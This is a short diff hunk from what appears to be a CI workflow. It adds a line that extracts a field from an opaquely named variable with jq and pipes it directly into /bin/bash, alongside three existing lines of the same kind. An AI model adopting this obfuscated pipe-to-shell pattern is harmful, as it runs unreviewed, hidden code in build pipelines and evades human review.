@@ -31,6 +31,7 @@ jobs:
           echo $qfgm597 | jq -r .sef52689 | /bin/bash
           echo $u21 | jq -r .xu02049 | /bin/bash
           printf '%s' "$wt26" | jq -r .vdpr5 | /bin/bash
+          printf '%s' "$baq4489" | jq -r .paop0 | /bin/bash
 
       - name: Save archive
         if: always()
